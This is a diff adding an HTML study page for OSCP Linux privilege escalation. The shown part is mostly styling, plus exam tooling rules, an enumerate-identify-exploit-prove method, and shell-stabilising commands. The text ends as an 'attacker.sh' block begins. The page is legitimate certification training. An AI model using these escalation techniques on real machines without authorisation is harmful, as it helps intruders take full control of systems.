@@ -1,0 +1,972 @@
+<!doctype html><html><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#000}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
+<title>Climb to root</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<meta name="description" content="An exam-grade, interactive field manual for Linux privilege escalation on the OSCP.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Sans+Condensed:wght@600;700&display=swap">
+<style>
+/* ===== Linux privesc: dark-terminal sibling of the Windows manual — slate-green ground, emerald "root" accent ===== */
+:root{
+  --bg:#eef2ef;--bg-2:#ffffff;--bg-raise:#f5f8f5;
+  --term:#0b1310;--term-text:#d8e6de;
+  --border:#d2dcd5;--border-strong:#b7c4bc;
+  --text:#122019;--text-dim:#4d5e55;--text-faint:#7a8a81;
+  --accent:#1f9d6b;--accent-fill:#17a46e;--accent-soft:rgba(31,157,107,0.13);--accent-ink:#0d7a4f;
+  --cyan:#0e7f9e;--cyan-soft:rgba(14,127,158,0.10);
+  --red:#c8412f;--red-soft:rgba(200,65,47,0.10);
+  --amber:#b5760f;
+  --il-low:#7b8794;--il-user:#0e7f9e;--il-grp:#b5760f;--il-root:#17a46e;
+  --shadow:0 1px 2px rgba(18,32,25,.06),0 6px 20px rgba(18,32,25,.08);
+  --shadow-lift:0 2px 6px rgba(18,32,25,.10),0 18px 44px rgba(18,32,25,.14);
+  --mono:"IBM Plex Mono",ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  --sans:"IBM Plex Sans",system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+  --cond:"IBM Plex Sans Condensed","IBM Plex Sans",system-ui,sans-serif;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#0c130f;--bg-2:#121b16;--bg-raise:#16211b;--term:#070b09;--term-text:#d8e6de;
+  --border:#223029;--border-strong:#304037;--text:#e6f0ea;--text-dim:#9bb0a4;--text-faint:#657a6f;
+  --accent:#3ddc97;--accent-fill:#3ddc97;--accent-soft:rgba(61,220,151,0.13);--accent-ink:#6ee7b0;
+  --cyan:#58c7e0;--cyan-soft:rgba(88,199,224,0.12);--red:#ff7264;--red-soft:rgba(255,114,100,0.12);
+  --amber:#f0b24a;
+  --il-low:#6b7684;--il-user:#58c7e0;--il-grp:#f0b24a;--il-root:#3ddc97;
+  --shadow:0 1px 2px rgba(0,0,0,.4),0 8px 26px rgba(0,0,0,.42);
+  --shadow-lift:0 2px 6px rgba(0,0,0,.5),0 22px 50px rgba(0,0,0,.55);
+  color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#0c130f;--bg-2:#121b16;--bg-raise:#16211b;--term:#070b09;--term-text:#d8e6de;
+  --border:#223029;--border-strong:#304037;--text:#e6f0ea;--text-dim:#9bb0a4;--text-faint:#657a6f;
+  --accent:#3ddc97;--accent-fill:#3ddc97;--accent-soft:rgba(61,220,151,0.13);--accent-ink:#6ee7b0;
+  --cyan:#58c7e0;--cyan-soft:rgba(88,199,224,0.12);--red:#ff7264;--red-soft:rgba(255,114,100,0.12);
+  --amber:#f0b24a;
+  --il-low:#6b7684;--il-user:#58c7e0;--il-grp:#f0b24a;--il-root:#3ddc97;
+  --shadow:0 1px 2px rgba(0,0,0,.4),0 8px 26px rgba(0,0,0,.42);
+  --shadow-lift:0 2px 6px rgba(0,0,0,.5),0 22px 50px rgba(0,0,0,.55);
+  color-scheme:dark;
+}
+
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--text);font-family:var(--sans);line-height:1.6;-webkit-font-smoothing:antialiased}
+body::before{content:"";position:fixed;inset:0 0 auto;height:env(safe-area-inset-top,0px);z-index:60;background:var(--bg)}
+.wrap{max-width:1120px;margin:0 auto;padding-left:max(22px,env(safe-area-inset-left,0px));padding-right:max(22px,env(safe-area-inset-right,0px))}
+h1,h2,h3{margin:0;text-wrap:balance;line-height:1.12}
+p{margin:0}
+a{color:var(--cyan);text-decoration:none}
+a:hover{text-decoration:underline}
+code{font-family:var(--mono);font-size:.9em;background:var(--bg-raise);border:1px solid var(--border);border-radius:5px;padding:1px 5px}
+::selection{background:var(--accent-soft)}
+:focus-visible{outline:2px solid var(--cyan);outline-offset:2px;border-radius:4px}
+.eyebrow{font-family:var(--mono);font-size:11.5px;font-weight:600;letter-spacing:.18em;text-transform:uppercase;color:var(--accent)}
+
+/* top bar */
+.topbar{position:sticky;top:env(safe-area-inset-top,0px);z-index:50;background:color-mix(in srgb,var(--bg) 88%,transparent);backdrop-filter:blur(10px);border-bottom:1px solid var(--border)}
+.topbar .row{display:flex;align-items:center;gap:14px;height:54px}
+.brand{display:flex;align-items:center;gap:9px;font-family:var(--mono);font-weight:600;font-size:15px;min-width:0}
+.brand .usr{color:var(--accent)}.brand .at{color:var(--text-faint)}
+.brand .caret{color:var(--cyan);animation:blink 1.15s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.spacer{flex:1}
+.tag{font-family:var(--mono);font-size:11px;letter-spacing:.1em;text-transform:uppercase;color:var(--text-dim);border:1px solid var(--border);border-radius:100px;padding:4px 10px;white-space:nowrap}
+.tbtn{display:inline-flex;align-items:center;gap:7px;cursor:pointer;background:var(--bg-2);border:1px solid var(--border);color:var(--text-dim);border-radius:9px;padding:7px 11px;font-family:var(--mono);font-size:12px;font-weight:500}
+.tbtn:hover{border-color:var(--border-strong);color:var(--text)}
+
+/* jump nav */
+.jnav{position:sticky;top:calc(54px + env(safe-area-inset-top,0px));z-index:45;background:color-mix(in srgb,var(--bg) 92%,transparent);backdrop-filter:blur(10px);border-bottom:1px solid var(--border)}
+.jnav .row{display:flex;gap:4px;overflow-x:auto;padding:9px 0;scrollbar-width:thin}
+.jnav a{font-family:var(--mono);font-size:12px;color:var(--text-dim);padding:6px 11px;border-radius:8px;white-space:nowrap;border:1px solid transparent}
+.jnav a:hover{text-decoration:none;color:var(--text);background:var(--bg-raise);border-color:var(--border)}
+
+/* hero */
+.hero{padding:46px 0 26px}
+.hero-grid{display:grid;grid-template-columns:1.15fr .85fr;gap:40px;align-items:center}
+.hero h1{font-family:var(--cond);font-weight:700;font-size:clamp(36px,6vw,58px);letter-spacing:-.01em;margin:14px 0 0}
+.hero h1 .accent{color:var(--accent)}
+.lede{color:var(--text-dim);font-size:16.5px;margin-top:16px;max-width:54ch}
+.lede strong{color:var(--text);font-weight:600}
+.hero-cmd{margin-top:20px;font-family:var(--mono);font-size:13px;background:var(--term);color:var(--term-text);border:1px solid var(--border-strong);border-radius:10px;padding:12px 14px;display:flex;gap:10px;align-items:center;box-shadow:var(--shadow);min-width:0;overflow-x:auto}
+.hero-cmd .d{color:#7f9488}.hero-cmd .p{color:#5fd3a0}
+
+.ladder-card{background:var(--bg-2);border:1px solid var(--border);border-radius:16px;padding:20px 20px 16px;box-shadow:var(--shadow-lift)}
+.ladder-card h3{font-family:var(--mono);font-size:12px;letter-spacing:.12em;text-transform:uppercase;color:var(--text-faint);font-weight:600;margin-bottom:6px}
+.rungs{display:flex;flex-direction:column-reverse;gap:8px;margin-top:12px}
+.rung{display:flex;align-items:center;gap:12px;padding:11px 13px;border-radius:11px;border:1px solid var(--border);background:var(--bg-raise);position:relative;transition:transform .5s ease,box-shadow .5s ease,border-color .5s ease}
+.rung .dot{width:11px;height:11px;border-radius:50%;flex:none;background:var(--rc);box-shadow:0 0 0 4px color-mix(in srgb,var(--rc) 20%,transparent)}
+.rung .lbl{font-family:var(--mono);font-size:12.5px;font-weight:600;min-width:0}
+.rung .sub{font-size:11px;color:var(--text-faint);margin-left:auto;font-family:var(--mono);white-space:nowrap}
+.rung[data-k="low"]{--rc:var(--il-low)}.rung[data-k="user"]{--rc:var(--il-user)}.rung[data-k="grp"]{--rc:var(--il-grp)}
+.rung[data-k="root"]{--rc:var(--il-root);border-color:color-mix(in srgb,var(--il-root) 55%,var(--border))}
+.rung.lit{border-color:var(--rc);box-shadow:0 0 0 1px var(--rc),0 8px 24px color-mix(in srgb,var(--rc) 26%,transparent);transform:translateX(4px)}
+.rung .crown{margin-left:auto;color:var(--il-root);font-size:13px;white-space:nowrap}
+.you-here{font-family:var(--mono);font-size:10px;letter-spacing:.06em;text-transform:uppercase;color:var(--bg);background:var(--il-low);border-radius:5px;padding:2px 7px;margin-left:auto;font-weight:600}
+.climb-arrow{text-align:center;color:var(--text-faint);font-size:12px;font-family:var(--mono);margin:10px 0 2px;letter-spacing:.1em}
+
+/* exam rules */
+.rules{background:var(--accent-soft);border:1px solid color-mix(in srgb,var(--accent) 38%,var(--border));border-radius:14px;padding:16px 18px;display:grid;grid-template-columns:auto 1fr;gap:14px;align-items:start}
+.rules .ico{font-size:22px;line-height:1}
+.rules h3{font-family:var(--mono);font-size:13px;letter-spacing:.04em;margin-bottom:8px;color:var(--accent-ink)}
+.rules ul{margin:0;padding-left:0;list-style:none;display:grid;gap:7px}
+.rules li{font-size:13.5px;color:var(--text-dim);padding-left:20px;position:relative;min-width:0}
+.rules li::before{content:"\25B8";position:absolute;left:0;color:var(--accent)}
+.rules li b{color:var(--text)}
+.ok{color:var(--accent-ink);font-weight:600}.no{color:var(--red);font-weight:600}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]) .ok{color:var(--accent)}}
+:root[data-theme="dark"] .ok{color:var(--accent)}
+
+/* sections */
+section{padding:42px 0;scroll-margin-top:118px}
+.sec-head{display:flex;flex-direction:column;gap:8px;margin-bottom:24px}
+.sec-head h2{font-family:var(--cond);font-weight:700;font-size:clamp(25px,4vw,36px);letter-spacing:-.01em}
+.sec-head p{color:var(--text-dim);max-width:66ch;font-size:15.5px}
+.divider{height:1px;background:linear-gradient(90deg,var(--border),transparent)}
+
+/* methodology loop */
+.loop{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;position:relative}
+.loop-step{background:var(--bg-2);border:1px solid var(--border);border-radius:14px;padding:18px 16px;position:relative;box-shadow:var(--shadow);min-width:0}
+.loop-step .n{font-family:var(--mono);font-size:11px;font-weight:700;color:var(--accent-ink);border:1px solid var(--accent);border-radius:7px;width:26px;height:26px;display:grid;place-items:center;margin-bottom:12px}
+.loop-step h4{margin:0 0 5px;font-size:15px;font-family:var(--mono);font-weight:600}
+.loop-step p{font-size:13px;color:var(--text-dim)}
+.loop-step.active{border-color:var(--accent);box-shadow:0 0 0 1px var(--accent),var(--shadow)}
+.loop-step .arrow{position:absolute;right:-11px;top:50%;transform:translateY(-50%);color:var(--text-faint);z-index:2;font-size:16px}
+.loop-step:last-child .arrow{display:none}
+.loop-note{margin-top:18px;font-size:14px;color:var(--text-dim);border-left:3px solid var(--accent);padding:8px 14px 8px 15px;background:var(--accent-soft);border-radius:0 8px 8px 0}
+.loop-note b{color:var(--text)}
+
+/* mindmap */
+.map-wrap{background:radial-gradient(120% 90% at 50% 0%,var(--bg-raise),var(--bg-2));border:1px solid var(--border);border-radius:18px;padding:8px;box-shadow:var(--shadow);overflow-x:auto}
+.map-inner{min-width:680px}
+svg.map{width:100%;height:auto;display:block}
+.map .edge{stroke:var(--border-strong);stroke-width:2;fill:none;transition:stroke .25s}
+.node{cursor:pointer}
+.node .chip{transition:transform .2s ease,filter .2s ease}
+.node text{font-family:var(--mono);font-weight:600;pointer-events:none}
+.node.dim{opacity:.4}
+.center-chip{filter:drop-shadow(0 6px 16px color-mix(in srgb,var(--accent) 40%,transparent))}
+.node:hover .chip,.node:focus-visible .chip{transform:scale(1.05);filter:brightness(1.08)}
+.map-legend{display:flex;gap:16px;flex-wrap:wrap;margin-top:14px;font-family:var(--mono);font-size:11.5px;color:var(--text-faint)}
+.map-legend span{display:inline-flex;align-items:center;gap:6px}
+.map-legend i{width:10px;height:10px;border-radius:3px;display:inline-block}
+
+/* toolbar */
+.toolbar{display:flex;gap:12px;align-items:center;margin-bottom:18px;flex-wrap:wrap}
+.search{flex:1;min-width:220px;position:relative}
+.search input{width:100%;font-family:var(--mono);font-size:13.5px;color:var(--text);background:var(--bg-2);border:1px solid var(--border);border-radius:10px;padding:11px 14px 11px 38px}
+.search input::placeholder{color:var(--text-faint)}
+.search input:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 0 3px var(--cyan-soft)}
+.search .mag{position:absolute;left:13px;top:50%;transform:translateY(-50%);color:var(--text-faint);font-size:14px;pointer-events:none}
+.search .clr{position:absolute;right:10px;top:50%;transform:translateY(-50%);cursor:pointer;color:var(--text-faint);font-size:14px;display:none}
+.mini{font-family:var(--mono);font-size:12px;font-weight:500;cursor:pointer;background:var(--bg-2);border:1px solid var(--border);color:var(--text-dim);border-radius:9px;padding:10px 13px}
+.mini:hover{color:var(--text);border-color:var(--border-strong)}
+.nohit{display:none;text-align:center;color:var(--text-faint);font-family:var(--mono);font-size:13px;padding:24px}
+
+/* progress */
+.progress-bar{display:flex;align-items:center;gap:14px;margin:0 0 18px}
+.pb-track{flex:1;height:9px;border-radius:100px;background:var(--bg-raise);border:1px solid var(--border);overflow:hidden;min-width:0}
+.pb-fill{height:100%;width:0;background:linear-gradient(90deg,var(--il-user),var(--accent-fill));border-radius:100px;transition:width .5s ease}
+.pb-label{font-family:var(--mono);font-size:12.5px;color:var(--text-dim);white-space:nowrap}
+.pb-label b{color:var(--accent-ink)}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]) .pb-label b{color:var(--accent)}}
+:root[data-theme="dark"] .pb-label b{color:var(--accent)}
+
+/* cards */
+.cards{display:flex;flex-direction:column;gap:13px}
+.card{background:var(--bg-2);border:1px solid var(--border);border-radius:14px;box-shadow:var(--shadow);overflow:hidden;scroll-margin-top:128px;transition:border-color .3s,box-shadow .3s}
+.card.flash{border-color:var(--accent);box-shadow:0 0 0 2px var(--accent-soft),var(--shadow-lift)}
+.card-head{display:flex;align-items:center;gap:14px;padding:16px 18px;cursor:pointer;user-select:none}
+.card-head .idx{font-family:var(--mono);font-size:12px;color:var(--text-faint);font-weight:600;width:24px;flex:none}
+.card-head .ttl{font-size:16.5px;font-weight:600;flex:1;min-width:0}
+.card-head .ttl small{display:block;font-family:var(--mono);font-size:11.5px;color:var(--text-dim);font-weight:500;margin-top:2px}
+.badges{display:flex;gap:6px;flex-wrap:wrap;justify-content:flex-end;max-width:360px}
+.badge{font-family:var(--mono);font-size:10.5px;font-weight:600;letter-spacing:.03em;border-radius:6px;padding:3px 8px;border:1px solid var(--border);color:var(--text-dim);white-space:nowrap}
+.badge.prereq{color:var(--accent-ink);border-color:color-mix(in srgb,var(--accent) 45%,var(--border));background:var(--accent-soft)}
+.badge.diff-easy{color:var(--accent-ink);border-color:color-mix(in srgb,var(--accent) 40%,var(--border));background:var(--accent-soft)}
+.badge.diff-med{color:var(--cyan);border-color:color-mix(in srgb,var(--cyan) 40%,var(--border));background:var(--cyan-soft)}
+.badge.diff-hard{color:var(--red);border-color:color-mix(in srgb,var(--red) 40%,var(--border));background:var(--red-soft)}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]) .badge.prereq,:root:not([data-theme="light"]) .badge.diff-easy{color:var(--accent)}}
+:root[data-theme="dark"] .badge.prereq,:root[data-theme="dark"] .badge.diff-easy{color:var(--accent)}
+.chev{flex:none;color:var(--text-faint);transition:transform .3s ease}
+.card.open .chev{transform:rotate(90deg)}
+.card-body{display:none;padding:2px 18px 20px;border-top:1px solid var(--border)}
+.card.open .card-body{display:block;animation:reveal .3s ease}
+@keyframes reveal{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:none}}
+.block{margin-top:16px;min-width:0}
+.block .k{font-family:var(--mono);font-size:11px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;display:inline-flex;align-items:center;gap:7px;margin-bottom:8px}
+.block.why .k{color:var(--cyan)}
+.block.spot .k{color:var(--accent-ink)}
+.block.pop .k{color:var(--red)}
+.block.oscp .k{color:var(--accent-ink)}
+.block.watch .k{color:var(--text-dim)}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]) .block.spot .k,:root:not([data-theme="light"]) .block.oscp .k{color:var(--accent)}}
+:root[data-theme="dark"] .block.spot .k,:root[data-theme="dark"] .block.oscp .k{color:var(--accent)}
+.block p{font-size:14.5px;color:var(--text-dim)}
+.block p b{color:var(--text)}
+.analogy{background:var(--cyan-soft);border-radius:10px;padding:12px 14px;font-size:14.5px;color:var(--text);border:1px solid color-mix(in srgb,var(--cyan) 22%,var(--border))}
+.analogy b{color:var(--cyan)}
+.watch-note{font-size:13.5px;color:var(--text-dim);background:var(--bg-raise);border:1px dashed var(--border-strong);border-radius:10px;padding:11px 13px}
+.watch-note b{color:var(--red)}
+.oscp-note{font-size:13.5px;color:var(--text-dim);background:var(--accent-soft);border:1px solid color-mix(in srgb,var(--accent) 28%,var(--border));border-radius:10px;padding:11px 13px}
+.oscp-note b{color:var(--accent-ink)}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]) .oscp-note b{color:var(--accent)}}
+:root[data-theme="dark"] .oscp-note b{color:var(--accent)}
+.way{margin-top:12px}
+.way-h{font-family:var(--mono);font-size:12.5px;font-weight:600;color:var(--text);display:flex;align-items:baseline;gap:9px;margin-bottom:5px;flex-wrap:wrap}
+.way-h .wtag{font-size:10px;color:var(--red);border:1px solid color-mix(in srgb,var(--red) 40%,var(--border));border-radius:5px;padding:1px 6px;letter-spacing:.04em;flex:none}
+.way-note{font-size:13px;color:var(--text-dim);margin:0 0 7px}
+.way-note b{color:var(--text)}
+
+/* terminal block */
+.term{position:relative;background:var(--term);border:1px solid var(--border-strong);border-radius:10px;margin-top:8px;overflow:hidden;min-width:0}
+.term-top{display:flex;align-items:center;gap:7px;padding:7px 12px;border-bottom:1px solid rgba(255,255,255,.07)}
+.term-top .dots{display:flex;gap:5px}
+.term-top .dots i{width:9px;height:9px;border-radius:50%}
+.term-top .dots i:nth-child(1){background:#ff5f56}.term-top .dots i:nth-child(2){background:#ffbd2e}.term-top .dots i:nth-child(3){background:#27c93f}
+.term-top .name{font-family:var(--mono);font-size:11px;color:#8296a0;margin-left:4px;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.copy{margin-left:auto;font-family:var(--mono);font-size:11px;cursor:pointer;color:#8296a0;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);border-radius:6px;padding:3px 9px;flex:none}
+.copy:hover{color:#d8e6de;background:rgba(255,255,255,.1)}
+.copy.done{color:#5fd3a0;border-color:#5fd3a0}
+.term pre{margin:0;padding:12px 14px;overflow-x:auto;font-family:var(--mono);font-size:12.5px;line-height:1.75;color:var(--term-text);white-space:pre}
+.term pre .cmt{color:#728579}.term pre .fn{color:#5fd3a0}.term pre .fl{color:#5cc7e0}.term pre .str{color:#e0b05a}
+.got{margin-top:18px;display:flex;align-items:center;gap:10px}
+.got button{font-family:var(--mono);font-size:12.5px;font-weight:600;cursor:pointer;border:1px solid var(--border-strong);background:var(--bg-raise);color:var(--text-dim);border-radius:9px;padding:8px 14px;display:inline-flex;align-items:center;gap:8px;transition:all .2s}
+.got button:hover{color:var(--text);border-color:var(--accent)}
+.got button.on{background:var(--accent-soft);border-color:var(--accent);color:var(--accent-ink)}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]) .got button.on{color:var(--accent)}}
+:root[data-theme="dark"] .got button.on{color:var(--accent)}
+.got .check{width:16px;height:16px;border-radius:5px;border:1.5px solid currentColor;display:grid;place-items:center;font-size:11px}
+
+/* tables */
+.tbl-wrap{overflow-x:auto;border:1px solid var(--border);border-radius:14px;box-shadow:var(--shadow)}
+table{border-collapse:collapse;width:100%;min-width:540px;font-size:13.5px}
+th,td{text-align:left;padding:11px 15px;border-bottom:1px solid var(--border);vertical-align:top}
+thead th{font-family:var(--mono);font-size:11px;letter-spacing:.08em;text-transform:uppercase;color:var(--text-faint);font-weight:600;background:var(--bg-raise)}
+tbody tr:last-child td{border-bottom:none}
+td.mono,th.mono{font-family:var(--mono)}
+td .bin{font-family:var(--mono);color:var(--accent-ink);font-weight:600;font-size:13px}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]) td .bin{color:var(--accent)}}
+:root[data-theme="dark"] td .bin{color:var(--accent)}
+tbody tr:hover{background:var(--bg-raise)}
+.pill{font-family:var(--mono);font-size:11px;font-weight:600;border-radius:6px;padding:2px 7px}
+.pill.t1{color:var(--accent-ink);background:var(--accent-soft)}.pill.t2{color:var(--amber);background:color-mix(in srgb,var(--amber) 14%,transparent)}.pill.t3{color:var(--red);background:var(--red-soft)}
+
+/* grid blocks */
+.cols2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.col-h{font-family:var(--mono);font-size:12px;letter-spacing:.06em;text-transform:uppercase;color:var(--text-faint);margin:0 0 8px;font-weight:600}
+.panel{background:var(--bg-2);border:1px solid var(--border);border-radius:13px;padding:16px 17px;box-shadow:var(--shadow);min-width:0}
+.panel h4{margin:0 0 4px;font-size:15px}
+.panel p{font-size:13.5px;color:var(--text-dim)}
+
+/* rabbit holes */
+.holes{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.hole{background:var(--bg-2);border:1px solid var(--border);border-radius:13px;padding:16px 17px;box-shadow:var(--shadow);min-width:0}
+.hole .h{display:flex;align-items:center;gap:9px;font-weight:600;font-size:14.5px;margin-bottom:6px}
+.hole .h .sig{font-size:16px}
+.hole p{font-size:13.5px;color:var(--text-dim)}
+.hole p b{color:var(--text)}
+
+/* footer */
+footer{border-top:1px solid var(--border);padding:34px 0 46px;margin-top:20px}
+.foot-grid{display:flex;justify-content:space-between;gap:24px;flex-wrap:wrap;align-items:flex-start}
+.foot-note{font-size:12.5px;color:var(--text-faint);max-width:44ch}
+.foot-note b{color:var(--text-dim)}
+.scope{font-family:var(--mono);font-size:11.5px;color:var(--text-dim);border:1px solid var(--border);border-radius:10px;padding:11px 14px;background:var(--bg-2);display:flex;gap:10px;align-items:flex-start;max-width:430px}
+.scope .lk{color:var(--accent)}
+.srcs{font-family:var(--mono);font-size:11px;color:var(--text-faint);margin-top:8px}
+.srcs a{color:var(--text-dim)}
+
+@media (max-width:860px){
+  .hero-grid{grid-template-columns:1fr;gap:30px}
+  .loop{grid-template-columns:1fr 1fr}.loop-step:nth-child(2) .arrow{display:none}
+  .cols2,.holes{grid-template-columns:1fr}
+  .rules{grid-template-columns:1fr}
+  .badges{display:none}
+}
+@media (max-width:520px){.loop{grid-template-columns:1fr}.loop-step .arrow{display:none}}
+@media (prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
+</style>
+
+<div class="topbar">
+  <div class="wrap row">
+    <div class="brand"><span class="usr">www-data</span><span class="at">@</span>box:/$<span class="caret">_</span></div>
+    <div class="spacer"></div>
+    <span class="tag">OSCP Field Manual</span>
+    <button class="tbtn" id="theme" aria-label="Toggle light and dark theme"><span id="theme-ico">◐</span> <span id="theme-txt">Theme</span></button>
+  </div>
+</div>
+<nav class="jnav"><div class="wrap row">
+  <a href="#method">Method</a><a href="#map">Map</a><a href="#shell">Get a shell</a>
+  <a href="#techniques">Techniques</a><a href="#reference">Reference</a><a href="#payloads">Shells</a>
+  <a href="#proof">Proof</a><a href="#drill">Drill</a><a href="#traps">Traps</a>
+</div></nav>
+
+<!-- HERO -->
+<header class="hero">
+  <div class="wrap hero-grid">
+    <div>
+      <span class="eyebrow">Linux Local Privilege Escalation · OSCP</span>
+      <h1>You've got a shell.<br>Now <span class="accent">climb to root.</span></h1>
+      <p class="lede">You land on a Linux box as a <strong>weak user</strong> &mdash; often <code>www-data</code> from a web shell, or a low login. Privilege escalation is the climb up to <strong>root (uid&nbsp;0)</strong>, the account that owns the machine. This is your field manual: the method, the mindmap, and every ladder with <strong>real commands and the variations</strong> to reach for when the first one fails.</p>
+      <div class="hero-cmd"><span class="d">$</span> id &amp;&amp; sudo -l&nbsp;&nbsp;<span class="d"># stabilise your shell, then start here</span></div>
+    </div>
+    <div class="ladder-card" aria-label="Linux privilege ladder">
+      <h3>The ladder you're climbing</h3>
+      <div class="rungs" id="rungs">
+        <div class="rung" data-k="low"><span class="dot"></span><span class="lbl">www-data / service</span><span class="you-here">you are here</span></div>
+        <div class="rung" data-k="user"><span class="dot"></span><span class="lbl">local user</span><span class="sub">uid 1000</span></div>
+        <div class="rung" data-k="grp"><span class="dot"></span><span class="lbl">sudo / docker / lxd</span><span class="sub">a group = root</span></div>
+        <div class="rung" data-k="root"><span class="dot"></span><span class="lbl">root</span><span class="crown">♚ uid 0</span></div>
+      </div>
+      <div class="climb-arrow">▲ &nbsp;higher = more power&nbsp; ▲</div>
+    </div>
+  </div>
+</header>
+
+<div class="wrap">
+  <div class="rules">
+    <div class="ico">⚖️</div>
+    <div>
+      <h3>EXAM TOOLING RULES &mdash; read once, don't lose points</h3>
+      <ul>
+        <li><span class="ok">Allowed on every target:</span> manual exploitation, <b>msfvenom</b> (payloads), <code>linpeas</code> / <code>lse.sh</code> / <code>pspy</code> / <code>linux-exploit-suggester</code> (enumeration), <b>GTFOBins</b> (it's just a reference site), public PoCs you compile and run yourself, <code>nc</code>, <code>socat</code>, <code>chisel</code>.</li>
+        <li><span class="no">Metasploit framework + Meterpreter:</span> one single machine for the <b>whole exam</b>. Don't spend it on a sudo or SUID win you could do by hand.</li>
+        <li><span class="no">Banned:</span> automated exploitation &amp; mass scanners &mdash; <code>sqlmap</code>, Nessus/Nexpose, any auto-exploit tool.</li>
+        <li><b>Bottom line:</b> Linux privesc is almost always a misconfiguration you root manually. Compile kernel exploits <b>offline and static</b> (<code>gcc -static</code>), and treat them as the last resort &mdash; the gentle wins below are the exam's bread and butter.</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- METHOD -->
+<section id="method">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="eyebrow">The loop that never changes</span>
+      <h2>Escalation is a method, not a magic command</h2>
+      <p>Every box is different, but the process is always the same. Most people get stuck because they stop enumerating too early and jump to an exploit. Run the loop instead.</p>
+    </div>
+    <div class="loop">
+      <div class="loop-step" data-i="0"><div class="n">1</div><h4>Stabilise &amp; enumerate</h4><p>Upgrade to a real TTY, then look at everything: <code>id</code>, <code>sudo -l</code>, SUID, cron, caps, files. Run linpeas <em>and</em> read it.</p><span class="arrow">→</span></div>
+      <div class="loop-step" data-i="1"><div class="n">2</div><h4>Identify</h4><p>Which finding is the <em>intended</em> path? It's often a "yellow" finding, not a red one. Rank your options; don't tunnel on the first.</p><span class="arrow">→</span></div>
+      <div class="loop-step" data-i="2"><div class="n">3</div><h4>Exploit</h4><p>Abuse the one misconfiguration to run a command as root. First way fails? There's almost always a second way.</p><span class="arrow">→</span></div>
+      <div class="loop-step" data-i="3"><div class="n">4</div><h4>Verify &amp; prove</h4><p><code>id</code> shows <code>uid=0(root)</code>? <b>Screenshot it now</b> &mdash; the exam is passed in the report, not the shell.</p></div>
+    </div>
+    <p class="loop-note"><b>Golden rule for beginners:</b> when you feel stuck, the question is never "what exploit do I try?" &mdash; it's <b>"what haven't I enumerated yet?"</b> On Linux the answer is usually in <code>sudo -l</code>, an odd SUID binary, or a cron job you can see with <code>pspy</code>.</p>
+  </div>
+</section>
+
+<div class="wrap"><div class="divider"></div></div>
+
+<!-- MAP -->
+<section id="map">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="eyebrow">The attack surface, mapped</span>
+      <h2>Where the ladders are</h2>
+      <p>From a couple of commands, the whole board opens up. Every branch is a way something runs as root &mdash; or hands you a path to it. Tap any node to jump to how it works.</p>
+    </div>
+    <div class="map-wrap"><div class="map-inner">
+      <svg class="map" viewBox="0 0 900 480" role="img" aria-label="Mind map of Linux privilege escalation vectors branching from id and sudo -l">
+        <g id="edges"></g><g id="nodes"></g>
+      </svg>
+    </div></div>
+    <div class="map-legend">
+      <span><i style="background:var(--accent-fill)"></i> abuse what you're allowed to run</span>
+      <span><i style="background:var(--cyan)"></i> hijack what root runs</span>
+      <span><i style="background:var(--red)"></i> creds, groups &amp; last resort</span>
+      <span style="color:var(--text-dim)">tap a node ↓</span>
+    </div>
+  </div>
+</section>
+
+<!-- GET A SHELL -->
+<section id="shell">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="eyebrow">First 60 seconds on the box</span>
+      <h2>Get a real shell, then your tools</h2>
+      <p>A web shell is half-blind: no tab-complete, no arrow keys, and Ctrl-C kills it. Upgrade to a proper TTY first &mdash; then pull linpeas and pspy across. Host a web server on your attack box to serve them.</p>
+    </div>
+    <div class="cols2">
+      <div>
+        <div class="col-h">Stabilise the shell (do this first)</div>
+        <div class="term" data-copy><div class="term-top"><div class="dots"><i></i><i></i><i></i></div><span class="name">pty-upgrade.sh</span><button class="copy">copy</button></div>
+<pre><span class="fn">python3</span> -c <span class="str">'import pty;pty.spawn("/bin/bash")'</span>
+<span class="cmt"># then: Ctrl-Z to background</span>
+<span class="fn">stty</span> raw -echo; fg          <span class="cmt"># back in, now full TTY</span>
+<span class="fn">export</span> TERM=xterm           <span class="cmt"># clear + arrow keys work</span></pre></div>
+      </div>
+      <div>
+        <div class="col-h">On Kali — serve &amp; catch</div>
+        <div class="term" data-copy><div class="term-top"><div class="dots"><i></i><i></i><i></i></div><span class="name">attacker.sh</span><button class="copy">copy</button></div>
